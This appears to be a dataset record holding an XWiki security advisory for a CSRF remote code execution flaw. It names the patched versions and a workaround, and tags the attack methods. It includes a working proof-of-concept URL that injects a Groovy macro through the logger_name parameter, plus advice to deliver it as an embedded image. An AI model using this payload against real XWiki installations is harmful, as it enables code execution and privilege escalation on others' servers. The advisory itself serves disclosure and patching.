{"description": "### Impact\n\n\n#### Steps to reproduce:\n\nIt is possible to trick a user with programming rights into visiting <xwiki-host>/xwiki/bin/view/XWiki/LoggingAdmin?loggeraction_set=1&logger_name=%7B%7Bcache%7D%7D%7B%7Bgroovy%7D%7Dnew+File%28%22%2Ftmp%2Fexploit.txt%22%29.withWriter+%7B+out+-%3E+out.println%28%22created+from+notification+filter+preferences%21%22%29%3B+%7D%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fcache%7D%7D&logger_level=TRACE where <xwiki-host> is the URL of your XWiki installation, e.g., by embedding an image with this URL in a document that is viewed by a user with programming rights.\n\n#### Expected result:\n\nNo file in /tmp/exploit.txt has been created.\n\n#### Actual result:\n\nThe file `/tmp/exploit.txt` is been created with content \"created from notification filter preferences!\". This demonstrates a CSRF remote code execution vulnerability that could also be used for privilege escalation or data leaks (if the XWiki installation can reach remote hosts).\n\n\n### Patches\nThe problem has been patched on XWiki 14.4.7, and 14.10.\n\n### Workarounds\nThe issue can be fixed manually applying this [patch](https://github.com/xwiki/xwiki-platform/commit/49fdfd633ddfa346c522d2fe71754dc72c9496ca).\n\n### References\n- https://jira.xwiki.org/browse/XWIKI-20291\n- https://github.com/xwiki/xwiki-platform/commit/49fdfd633ddfa346c522d2fe71754dc72c9496ca\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n*    Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n*    Email us at [Security Mailing List](mailto:security@xwiki.org)\n", "methods": ["Used Eval Injection to execute arbitrary code.", "Used CSRF to execute arbitrary code.", "Used Remote Code Execution to execute arbitrary code.", "Used Privilege Escalation to gain elevated privileges.", "Used Data Leaks to access sensitive data."]}
